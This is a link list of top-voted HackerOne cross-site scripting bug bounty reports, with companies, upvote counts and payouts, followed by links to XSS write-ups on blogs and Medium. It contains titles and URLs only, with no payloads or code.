1. [Bypass for #488147 enables stored XSS on](https://hackerone.com/reports/510152) [https://paypal.com/signin](https://paypal.com/signin) again to PayPal - 2530 upvotes, $20000
2. [Stored XSS on](https://hackerone.com/reports/488147) [https://paypal.com/signin](https://paypal.com/signin) via cache poisoning to PayPal - 646 upvotes, $18900
3. [Reflected XSS on](https://hackerone.com/reports/846338) [https://www.glassdoor.com/employers/sem-dual-lp/](https://www.glassdoor.com/employers/sem-dual-lp/) to Glassdoor - 632 upvotes, $1000
4. [Stored XSS in Wiki pages](https://hackerone.com/reports/526325) to GitLab - 595 upvotes, $4500
5. [Stored XSS on imgur profile](https://hackerone.com/reports/484434) to Imgur - 591 upvotes, $650
6. [Reflected XSS in OAUTH2 login flow](https://hackerone.com/reports/697099) to LINE - 471 upvotes, $1989
7. [XSS in steam react chat client](https://hackerone.com/reports/409850) to Valve - 453 upvotes, $7500
8. [Cross-Site-Scripting on www.tiktok.com and m.tiktok.com leading to Data Exfiltration](https://hackerone.com/reports/968082) to TikTok - 449 upvotes, $3860
9. [XSS vulnerable parameter in a location hash](https://hackerone.com/reports/146336) to Slack - 440 upvotes, $1100
10. [One-click account hijack for anyone using Apple sign-in with Reddit, due to response-type switch + leaking href to XSS on www.redditmedia.com](https://hackerone.com/reports/1567186) to Reddit - 419 upvotes, $10000
11. [Panorama UI XSS leads to Remote Code Execution via Kick/Disconnect Message](https://hackerone.com/reports/631956) to Valve - 407 upvotes, $9000
12. [Blind XSS on image upload](https://hackerone.com/reports/1010466) to CS Money - 407 upvotes, $1000
13. [Stored XSS Vulnerability](https://hackerone.com/reports/643908) to WordPress - 394 upvotes, $500
14. [Reflected XSS and sensitive data exposure, including payment details, on lioncityrentals.com.sg](https://hackerone.com/reports/340431) to Uber - 369 upvotes, $4000
15. [Reflected XSS on www.hackerone.com and resources.hackerone.com](https://hackerone.com/reports/840759) to HackerOne - 355 upvotes, $500
16. [Stored XSS in wordpress.com](https://hackerone.com/reports/733248) to Automattic - 348 upvotes, $650
17. [HEY.com email stored XSS](https://hackerone.com/reports/982291) to Basecamp - 345 upvotes, $5000
18. [Reflected XSS in TikTok endpoints](https://hackerone.com/reports/1350887) to TikTok - 344 upvotes, $4500
19. [Blind XSS on Twitter's internal Big Data panel at █████████████](https://hackerone.com/reports/1207040) to Twitter - 338 upvotes, $5040
20. [Stored XSS in Private Message component (BuddyPress)](https://hackerone.com/reports/487081) to WordPress - 331 upvotes, $500
21. [XSS while logging using Google](https://hackerone.com/reports/691611) to Shopify - 325 upvotes, $1750
22. [Stored XSS in my staff name fired in another your internal panel](https://hackerone.com/reports/946053) to Shopify - 316 upvotes, $5000
23. [DOM XSS on duckduckgo.com search](https://hackerone.com/reports/868934) to DuckDuckGo - 316 upvotes, $0

## Cross Site Scripting (XSS) Write\_ups

* [From P5 to P2 to 100 BXSS](https://medium.com/@mohameddaher/from-p5-to-p5-to-p2-from-nothing-to-1000-bxss-4dd26bc30a82)
* [Google Acquisition XSS (Apigee)](https://medium.com/@TnMch/google-acquisition-xss-apigee-5479d7b5dc4)
* [DOM-Based XSS at accounts.google.com by Google Voice Extension](http://www.missoumsai.com/google-accounts-xss.html)
* [XSS on Microsoft.com via Angular Js template injection](https://medium.com/@impratikdabhi/reflected-xss-on-microsoft-com-via-angular-template-injection-2e26d80a7fd8)
* [Researching Polymorphic Images for XSS on Google Scholar](https://blog.doyensec.com/2020/04/30/polymorphic-images-for-xss.html)
* [Netflix Party Simple XSS](https://medium.com/@kristian.balog/netflix-party-simple-xss-ec92ed1d7e18)
* [Stored XSS in google nest](https://medium.com/bugbountywriteup/stored-xss-in-google-nest-a82373bbda68)
* [Self XSS to persistent XSS on login portal](https://medium.com/@nnez/always-escalate-from-self-xss-to-persistent-xss-on-login-portal-54265b0adfd0)
* [Universal XSS affecting Firefox](https://0x65.dev/blog/2020-03-30/cve-2019-17004-semi-universal-xss-affecting-firefox-for-ios.html)
* [XSS WAF Character limitation bypass like a boss](https://medium.com/bugbountywriteup/xss-waf-character-limitation-bypass-like-a-boss-2c788647c229)
* [Self XSS to Account Takeover](https://medium.com/@ch3ckm4te/self-xss-to-account-takeover-72c89775cf8f)
* [Reflected XSS on Microsoft subdomains](https://medium.com/bugbountywriteup/reflected-xss-on-microsoft-com-subdomains-4bdfc2c716df)
* [The tricky XSS](https://smaranchand.com.np/2020/02/the-tricky-xss/)
* [Reflected XSS in AT\&T](https://medium.com/@godofdarkness.msf/reflected-xss-in-at-t-7f1bdd10d8f7)
* [XSS on Google using Acunetix](https://www.acunetix.com/blog/web-security-zone/xss-google-acunetix/)
* [Exploiting websocket application wide XSS](https://medium.com/@osamaavvan/exploiting-websocket-application-wide-xss-csrf-66e9e2ac8dfa)
* [Reflected XSS with HTTP Smuggling](https://hazana.xyz/posts/escalating-reflected-xss-with-http-smuggling/)
* [XSS on Facebook instagram CDN server bypassing signature protection](https://www.amolbaikar.com/xss-on-facebook-instagram-cdn-server-bypassing-signature-protection/)
